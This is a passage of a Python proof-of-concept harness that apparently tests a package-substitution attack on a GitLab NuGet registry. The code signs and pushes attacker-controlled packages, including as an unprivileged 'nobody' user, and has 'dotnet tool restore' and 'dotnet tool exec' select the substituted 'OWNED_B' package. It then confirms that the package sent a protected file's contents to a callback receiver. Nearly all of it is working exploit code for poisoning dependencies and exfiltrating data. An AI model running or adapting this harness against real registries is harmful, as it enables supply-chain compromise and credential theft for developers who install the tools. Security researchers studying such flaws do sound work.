          verification_config.write_text(
              '<?xml version="1.0"?><configuration><packageSources><clear/></packageSources>' +
              signer_xml + '</configuration>')
          for marker in ("A", "B"):
              package = packages[("Impact", marker)][2]
              checked = subprocess.run(
                  ["dotnet", "nuget", "verify", "--all", str(package),
                   "--configfile", str(verification_config)],
                  capture_output=True, text=True, timeout=120)
              output = checked.stdout + checked.stderr
              summary["controls"].append(
                  {"case": "direct_verify_impact_" + marker, "exit": checked.returncode,
                   "nu3004": "NU3004" in output, "nu3008": "NU3008" in output,
                   "nu3034": "NU3034" in output, "nu3018": "NU3018" in output,
                   "package_sha256": hashlib.sha256(package.read_bytes()).hexdigest()})
              if (marker == "A" and checked.returncode != 0) or (
                      marker == "B" and checked.returncode == 0):
                  raise RuntimeError("Direct signing control failed for " + marker +
                                     ": " + output[-700:])
          other_author_config = temp / "other-author-policy.config"
          other_author_config.write_text(
              '<?xml version="1.0"?><configuration><packageSources><clear/></packageSources>'
              '<config><add key="signatureValidationMode" value="require"/></config>'
              '<trustedSigners><author name="OwnedL108OtherAuthor"><certificate fingerprint="' +
              attacker_fingerprint +
              '" hashAlgorithm="SHA256" allowUntrustedRoot="true"/></author></trustedSigners>'
              '</configuration>')
          other_checked = subprocess.run(
              ["dotnet", "nuget", "verify", "--all", str(packages[("Impact", "B")][2]),
               "--configfile", str(other_author_config)],
              capture_output=True, text=True, timeout=120)
          summary["controls"].append(
              {"case": "direct_verify_impact_B_with_other_author_trusted",
               "exit": other_checked.returncode})
          if other_checked.returncode:
              raise RuntimeError("Other author's B signature was invalid: " +
                                 (other_checked.stdout + other_checked.stderr)[-700:])

          def package_hash(package):
              return hashlib.sha256(package.read_bytes()).hexdigest()

          def push(series, marker, project_id, token, expect_success=True,
                   lower_os=False):
              package = packages[(series, marker)][2]
              source = f"{base}/api/v4/projects/{project_id}/packages/nuget/index.json"
              package_for_push = package
              if lower_os:
                  package_for_push = pathlib.Path("/tmp") / (
                      "l108-owned-" + suffix + "-" + series.lower() + "-" +
                      marker.lower() + ".nupkg")
                  shutil.copyfile(package, package_for_push)
                  package_for_push.chmod(0o644)
              cmd = [shutil.which("dotnet"), "nuget", "push", str(package_for_push),
                     "--source", source, "--api-key", token,
                     "--allow-insecure-connections", "--no-symbols", "--force-english-output"]
              if lower_os:
                  cmd = ["sudo", "-u", "nobody", "curl", "--silent", "--show-error",
                         "--request", "PUT", "--form",
                         "package=@" + str(package_for_push),
                         "--user", users["publisher"]["username"] + ":" + token,
                         "--output", "/dev/null", "--write-out", "%{http_code}",
                         f"{base}/api/v4/projects/{project_id}/packages/nuget/"]
              result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
              accepted = (result.returncode == 0 and
                          (result.stdout.strip() in ("200", "201") if lower_os else True))
              summary["controls"].append(
                  {"case": f"push_{series}_{marker}_to_{project_id}",
                   "exit": result.returncode,
                   "lower_os": lower_os,
                   "http": result.stdout.strip() if lower_os else None,
                   "package_sha256": package_hash(package)})
              if lower_os and not expect_success and result.stdout.strip() not in (
                      "401", "403", "404"):
                  raise RuntimeError("Denied lower-OS push did not reach GitLab authorization")
              if accepted != expect_success:
                  output = (result.stdout + result.stderr).replace(token, "[masked]")
                  raise RuntimeError("Unexpected push result: " + output[-800:])

          def restore(series, case, expected_marker, expected_package, password=None,
                      strict=False, invoke=True, exfil=False):
              package_id, command, _ = packages[(series, "A")]
              directory = temp / "consumers" / case
              directory.mkdir(parents=True, exist_ok=True)
              (directory / ".config").mkdir(exist_ok=True)
              manifest = {"version": 1, "isRoot": True,
                          "tools": {package_id.lower(): {"version": "1.0.0",
                                                         "commands": [command]}}}
              (directory / ".config" / "dotnet-tools.json").write_text(json.dumps(manifest))
              if password is None:
                  password = tokens["reader"]
              config = directory / "NuGet.Config"
              config.write_text(
                  '<?xml version="1.0"?><configuration><packageSources><clear/>'
                  '<add key="ownedgroup" value="' + base + f'/api/v4/groups/{gid}/-/packages/nuget/index.json" '
                  'protocolVersion="3" allowInsecureConnections="true"/></packageSources>'
                  '<packageSourceCredentials><ownedgroup><add key="Username" value="' +
                  users["reader"]["username"] + '"/>'
                  '<add key="ClearTextPassword" value="' + escape(password) +
                  '"/></ownedgroup></packageSourceCredentials>' +
                  (signer_xml if strict else '') + '</configuration>')
              os.chmod(config, 0o600)
              env = os.environ.copy()
              env["DOTNET_CLI_HOME"] = str(directory / "cli-home")
              env["NUGET_PACKAGES"] = str(directory / "packages")
              env["NUGET_HTTP_CACHE_PATH"] = str(directory / "http-cache")
              env["DOTNET_NOLOGO"] = "1"
              env["DOTNET_CLI_TELEMETRY_OPTOUT"] = "1"
              env["DOTNET_NUGET_SIGNATURE_VERIFICATION"] = "true"
              command_line = ["dotnet", "tool", "restore",
                              "--tool-manifest", str(directory / ".config" / "dotnet-tools.json"),
                              "--configfile", str(config), "--no-cache", "--verbosity", "minimal"]
              result = subprocess.run(command_line, cwd=directory, env=env,
                                      capture_output=True, text=True, timeout=180)
              if expected_marker is None:
                  summary["controls"].append({"case": case, "restore_exit": result.returncode})
                  if result.returncode == 0:
                      raise RuntimeError("Wrong-credential restore unexpectedly succeeded")
                  return
              if result.returncode:
                  output = (result.stdout + result.stderr).replace(password, "[masked]")
                  raise RuntimeError("Restore failed: " + output[-800:])
              post_before = len(read_events())
              if exfil:
                  env["L108_PROTECTED_PATH"] = str(protected_file)
                  env["L108_OWNED_RECEIVER"] = callback
              run = (subprocess.run(["dotnet", "tool", "run", command],
                                    cwd=directory, env=env, capture_output=True,
                                    text=True, timeout=90) if invoke else None)
              stored = list((directory / "packages").rglob("*.nupkg"))
              stored_entries = sorted(
                  [{"path": str(p.relative_to(directory)), "sha256": package_hash(p)}
                   for p in stored], key=lambda x: x["path"])
              if (run is not None and run.returncode) or not stored:
                  exit_code = run.returncode if run else None
                  raise RuntimeError(f"Invocation or archive storage failed: {exit_code}, {len(stored)}")
              marker = run.stdout.strip() if run else None
              expected_hash = package_hash(packages[(series, expected_package)][2])
              post_after = read_events()
              summary["controls"].append(
                  {"case": case, "restore_exit": result.returncode,
                   "invoke_exit": run.returncode if run else None, "output": marker,
                   "strict": strict, "explicit_invoke": invoke,
                   "post_count_before": post_before, "post_count_after": len(post_after),
                   "stored_archives": stored_entries, "expected_sha256": expected_hash})
              if ((invoke and marker != "OWNED_" + expected_marker) or
                      expected_hash not in [x["sha256"] for x in stored_entries]):
                  raise RuntimeError(f"{case}: wrong selected package")
              expected_posts = post_before + (1 if exfil and invoke else 0)
              if len(post_after) != expected_posts:
                  raise RuntimeError(f"{case}: unexpected protected POST count")
              if exfil and invoke and post_after[-1]["token_sha256"] != (
                      hashlib.sha256(protected_bytes).hexdigest()):
                  raise RuntimeError(f"{case}: protected POST body mismatch")
              if exfil and invoke and (
                      post_after[-1]["uid"] != 65534 or
                      post_after[-1]["gitlab_write_http"] != 201):
                  raise RuntimeError(f"{case}: lower receiver failed protected A write")
              return directory, env

          def exec_one_shot(case):
              package_id = packages[("Impact", "A")][0]
              directory = temp / "one-shot" / case
              directory.mkdir(parents=True, exist_ok=True)
              config = directory / "NuGet.Config"
              shutil.copyfile(temp / "consumers" / "signed_a_only" / "NuGet.Config", config)
              os.chmod(config, 0o600)
              env = os.environ.copy()
              env["DOTNET_CLI_HOME"] = str(directory / "cli-home")
              env["NUGET_PACKAGES"] = str(directory / "packages")
              env["NUGET_HTTP_CACHE_PATH"] = str(directory / "http-cache")
              env["DOTNET_NUGET_SIGNATURE_VERIFICATION"] = "true"
              env["DOTNET_NOLOGO"] = "1"
              env["DOTNET_CLI_TELEMETRY_OPTOUT"] = "1"
              env["L108_PROTECTED_PATH"] = str(protected_file)
              env["L108_OWNED_RECEIVER"] = callback
              before = len(read_events())
              command_line = ["dotnet", "tool", "exec", package_id + "@1.0.0",
                              "--yes", "--configfile", str(config),
                              "--no-http-cache", "--verbosity", "minimal"]
              result = subprocess.run(command_line, cwd=directory, env=env,
                                      capture_output=True, text=True, timeout=180)
              output = result.stdout + result.stderr
              events = read_events()
              stored = sorted(
                  {package_hash(path) for path in directory.rglob("*.nupkg")})
              expected_hash = package_hash(packages[("Impact", "B")][2])
              summary["controls"].append(
                  {"case": case, "exit": result.returncode,
                   "output_marker": "OWNED_B" in output.splitlines(),
                   "post_count_before": before, "post_count_after": len(events),
                   "stored_archive_hashes": stored,
                   "expected_sha256": expected_hash})
